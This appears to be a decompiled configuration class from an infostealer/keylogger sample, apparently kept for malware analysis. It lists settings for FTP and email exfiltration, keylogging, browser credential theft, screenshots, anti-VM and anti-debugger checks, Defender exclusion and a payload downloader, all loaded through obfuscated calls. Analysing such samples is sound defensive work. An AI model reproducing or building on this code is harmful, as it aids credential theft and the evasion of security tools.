// Decompiled with JetBrains decompiler
// Type: VW1.XWr
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

namespace VW1
{
  internal static class XWr
  {
    public static string Key;
    public static string Version;
    public static string FtpEnable;
    public static string FtpHost;
    public static string FtpUser;
    public static string FtpPass;
    public static string FtpPort;
    public static string EmailEnable;
    public static string EmailAddress;
    public static string EmailSendTo;
    public static string EmailPass;
    public static string EmailPort;
    public static string EmailSsl;
    public static string EmailClient;
    public static string PanelEnable;
    public static string PanelHost;
    public static string ExitAfterDelivery;
    public static string SelfDestruct;
    public static string Mutex;
    public static string EnableMutex;
    public static string EnableAntiSandboxie;
    public static string EnableAntiVMware;
    public static string EnableAntiDebugger;
    public static string EnableWDExclusion;
    public static string EnableSearchAndUpload;
    public static string EnableKeylogger;
    public static string EnableBrowserRecovery;
    public static string EnableScreenshot;
    public static string EnableForceUac;
    public static string EnableBotKiller;
    public static string EnableDeleteZoneIdentifier;
    public static string EnableMemoryScan;
    public static string EnableAntiHoneypot;
    public static string EnableOnlySendWhenPassword;
    public static string ExectionDelay;
    public static string SendingInterval;
    public static string EnableDownloader;
    public static string DownloaderUrl;
    public static string DownloaderFilename;
    public static string DownloaderOnce;
    public static string EnableBinder;
    public static string BinderBytes;
    public static string BinderName;
    public static string BinderOnce;
    public static string EnableInstall;
    public static string InstallFolder;
    public static string InstallSecondFolder;
    public static string InstallFile;
    public static object SafeThread;
    public static bool IsPass;
    internal static XWr CaU;

    public static bool CCX() => (bool) aP.bx(8, new object[0], (object) null, aP.cB)[0];

    static XWr()
    {
      yd.bx(yd.EI);
      XWr.Key = w4.bx(13114, w4.vY);
      XWr.Version = w4.bx(13206, w4.vY);
      XWr.FtpEnable = w4.bx(13426, w4.vY);
      XWr.FtpHost = w4.bx(13606, w4.vY);
      XWr.FtpUser = w4.bx(13826, w4.vY);
      XWr.FtpPass = w4.bx(14046, w4.vY);
      XWr.FtpPort = w4.bx(14226, w4.vY);
      XWr.EmailEnable = w4.bx(14406, w4.vY);
      XWr.EmailAddress = w4.bx(14586, w4.vY);
      XWr.EmailSendTo = w4.bx(14766, w4.vY);
      XWr.EmailPass = w4.bx(14986, w4.vY);
      int num1 = 2;
      if (true)
        goto label_7;
label_2:
      while (true)
      {
        switch (num1)
        {
          case 1:
            XWr.EnableScreenshot = w4.bx(18046, w4.vY);
            XWr.EnableForceUac = w4.bx(18226, w4.vY);
            XWr.EnableBotKiller = w4.bx(18406, w4.vY);
            XWr.EnableDeleteZoneIdentifier = w4.bx(18586, w4.vY);
            XWr.EnableMemoryScan = w4.bx(18766, w4.vY);
            XWr.EnableAntiHoneypot = w4.bx(18946, w4.vY);
            XWr.EnableOnlySendWhenPassword = w4.bx(19126, w4.vY);
            num1 = false ? 4 : 4;
            continue;
          case 2:
            XWr.EmailPort = w4.bx(15166, w4.vY);
            XWr.EmailSsl = w4.bx(15346, w4.vY);
            XWr.EmailClient = w4.bx(15526, w4.vY);
            XWr.PanelEnable = w4.bx(15706, w4.vY);
            XWr.PanelHost = w4.bx(15886, w4.vY);
            XWr.ExitAfterDelivery = w4.bx(16066, w4.vY);
            XWr.SelfDestruct = w4.bx(16246, w4.vY);
            XWr.Mutex = w4.bx(16426, w4.vY);
            XWr.EnableMutex = w4.bx(16606, w4.vY);
            XWr.EnableAntiSandboxie = w4.bx(16786, w4.vY);
            XWr.EnableAntiVMware = w4.bx(16966, w4.vY);
            XWr.EnableAntiDebugger = w4.bx(17146, w4.vY);
            XWr.EnableWDExclusion = w4.bx(17326, w4.vY);
            XWr.EnableSearchAndUpload = w4.bx(17506, w4.vY);
            XWr.EnableKeylogger = w4.bx(17686, w4.vY);
            XWr.EnableBrowserRecovery = w4.bx(17866, w4.vY);
            if (true)
            {
              num1 = 1;
              continue;
            }
            break;
          case 3:
            XWr.BinderBytes = w4.bx(20566, w4.vY);
            XWr.BinderName = w4.bx(20786, w4.vY);
            XWr.BinderOnce = w4.bx(21006, w4.vY);
            num1 = true ? 0 : 0;
            continue;
          case 4:
            XWr.ExectionDelay = w4.bx(19306, w4.vY);
            XWr.SendingInterval = w4.bx(19486, w4.vY);
            XWr.EnableDownloader = w4.bx(19666, w4.vY);
            XWr.DownloaderUrl = w4.bx(19846, w4.vY);
            XWr.DownloaderFilename = w4.bx(20026, w4.vY);
            XWr.DownloaderOnce = w4.bx(20206, w4.vY);
            XWr.EnableBinder = w4.bx(20386, w4.vY);
            if (true)
            {
              num1 = 3;
              continue;
            }
            break;
          default:
            goto label_4;
        }
        int num2;
        num1 = num2;
      }
label_4:
      XWr.EnableInstall = w4.bx(21186, w4.vY);
      XWr.InstallFolder = w4.bx(21366, w4.vY);
      XWr.InstallSecondFolder = w4.bx(21546, w4.vY);
      XWr.InstallFile = w4.bx(21726, w4.vY);
      XWr.SafeThread = new object();
      XWr.IsPass = false;
      return;
label_7:
      num1 = 2;
      goto label_2;
    }

    internal static bool aa2() => XWr.CaU == null;

    internal static XWr Mav() => XWr.CaU;
  }
}
